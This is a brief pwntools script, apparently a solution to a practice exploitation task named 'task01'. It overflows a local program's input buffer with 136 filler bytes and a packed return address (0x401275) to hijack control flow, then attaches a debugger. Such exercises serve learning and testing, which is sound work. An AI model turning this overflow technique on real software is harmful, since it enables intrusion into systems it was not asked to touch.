from pwn import *


io = process("./task01")
io.recvuntil("What is your name?")
password = b'A' * 136 + p64(0x401275)
io.sendline(password)

gdb.attach(io)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break
io.kill()

# io.interactive()